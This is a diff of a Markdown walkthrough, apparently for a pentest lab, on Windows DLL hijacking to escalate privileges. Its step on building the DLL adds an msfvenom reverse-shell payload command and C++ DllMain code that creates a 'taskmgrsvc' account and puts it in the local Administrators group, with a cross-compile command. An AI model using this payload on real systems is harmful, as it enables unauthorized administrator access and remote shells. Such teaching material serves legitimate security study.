@@ -48,47 +48,56 @@ If successful, you have sufficient permissions to place a malicious DLL in this 
 
 ---
 
-### Step 3: Create a Malicious DLL
-The goal is to create a DLL that executes malicious commands when loaded. In this case, the DLL will add a new user to the local Administrators group.
+#### Step 3: Create a Malicious DLL
+-
+  ### Option 1: Using msfvenom
+  -
+    On our attacker machine (e.g., Kali Linux), use `msfvenom` to generate a malicious executable that creates a new user and adds it to the Administrators group:
 
-#### Malicious DLL Code in C++:
-```cpp
-#include <stdlib.h>
-#include <windows.h>
+    ```bash
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o EnterpriseServiceOptional.dll
+    ```
+-
+  ### Option 2. Compile with the following C program:
 
-BOOL APIENTRY DllMain(
-HANDLE hModule,// Handle to DLL module
-DWORD ul_reason_for_call,// Reason for calling function
-LPVOID lpReserved ) // Reserved
-{
-    switch ( ul_reason_for_call )
+  -
+    #### Malicious DLL Code in C++:
+    ```cpp
+    #include <stdlib.h>
+    #include <windows.h>
+
+    BOOL APIENTRY DllMain(
+    HANDLE hModule,// Handle to DLL module
+    DWORD ul_reason_for_call,// Reason for calling function
+    LPVOID lpReserved ) // Reserved
     {
-        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
-        int i;
-  	    i = system ("net user taskmgrsvc Password123! /add");
-  	    i = system ("net localgroup administrators taskmgrsvc /add");
-        break;
-        case DLL_THREAD_ATTACH: // A process is creating a new thread.
-        break;
-        case DLL_THREAD_DETACH: // A thread exits normally.
-        break;
-        case DLL_PROCESS_DETACH: // A process unloads the DLL.
-        break;
+        switch ( ul_reason_for_call )
+        {
+            case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+            int i;
+                i = system ("net user taskmgrsvc Password123! /add");
+                i = system ("net localgroup administrators taskmgrsvc /add");
+            break;
+            case DLL_THREAD_ATTACH: // A process is creating a new thread.
+            break;
+            case DLL_THREAD_DETACH: // A thread exits normally.
+            break;
+            case DLL_PROCESS_DETACH: // A process unloads the DLL.
+            break;
+        }
+        return TRUE;
     }
-    return TRUE;
-}
-```
+    ``` 
+---
 
 #### Compile the DLL:
 On your Kali machine, cross-compile the DLL using `mingw-w64`:
 
 ```bash
-x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+x86_64-w64-mingw32-gcc <File>.cpp --shared -o <File>.dll
 ```
 
 - **`--shared`**: Generates a DLL file.
-- **`TextShaping.dll`**: The name must match the vulnerable DLL identified earlier.
-
 ---
 
 ### Step 4: Transfer the DLL to the Target Directory
